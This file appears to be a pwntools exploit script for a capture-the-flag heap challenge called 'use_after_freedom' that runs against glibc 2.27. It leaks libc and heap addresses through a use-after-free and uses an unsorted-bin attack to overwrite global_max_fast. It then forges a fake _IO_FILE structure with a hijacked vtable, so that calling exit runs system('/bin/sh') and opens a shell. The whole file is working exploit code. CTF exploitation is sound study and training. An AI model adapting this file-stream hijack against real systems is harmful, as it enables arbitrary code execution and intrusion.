from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']
TARGET = './use_after_freedom'
LIBC = './libc-2.27.so'
HOST = 'use-after-freedom.hsc.tf'
PORT = 1337

elf = ELF(TARGET)
libc = ELF(LIBC)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split(b'-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $_base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c\n"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def a(size, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter('> ', str(size))
	r.sendafter('> ', data)

def d(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', str(idx))

def e(idx, data):
	r.sendlineafter('> ', '3')
	r.sendlineafter('> ', str(idx))
	r.sendafter('> ', data)

def v(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter('> ', str(idx))

a(0x500, 'A')   #0 for libc leak
a(0x1430, 'a')  #1 for fake fsop + overwrite _IO_list_all (well sized)
a(0x18, 'A')	#2 for avoiding consolidation with top chunk

# leak libc
d(0)
v(0)
leak = u64(r.recvuntil('\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak - 0x3ebca0
dbg('base')
system = base + libc.sym.system
iolistall = base + libc.sym._IO_list_all
globalmaxfast = base + 0x3ed940
lock = globalmaxfast-8

# we choose io_wfile_sync for our vtable function
# qword p[fake + 0x98] -> rdi
# qword p[qword p[fake + 0x98] + 0x20] -> function
vtable = base + 0x3e7d00 - 0x18

# leak heap from key
d(2)
e(2, 'A'*8)
v(2)
r.recvuntil('A'*8)
leak = u64(r.recvuntil('\n', True).ljust(8, b'\x00'))
dbg('leak')
heap = leak - 0x10
dbg('heap')

# overwrite global_max_fast with big num using unsortedbin attack
e(0, flat(0, globalmaxfast-0x10))
a(0x500, 'a') #3

# build fake _IO_file struct
d(1)
payload = b''
payload += flat(0, 0)
payload += flat(0, 1)
payload += flat(0, 0)
payload += flat(1, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(1, 0)
payload += flat(0, 0)
payload += flat(0xffffffffffffffff, heap+0x840) 
payload += flat(lock, 0)
payload += flat(0, 0)
payload += flat(0xffffffff, 0)
payload += flat(0, vtable)
payload += b'/bin/sh\x00' # here is heap + 0x840
payload += flat(0, 0, 0, system) # system ptr is at heap + 0x840 + 0x20

a(0x1430, payload) #4
d(4)

# call exit to trigger _IO_flush_lockp -> io_wfile_sync -> system
pause()
r.sendlineafter('> ', '5')

r.interactive()
r.close()
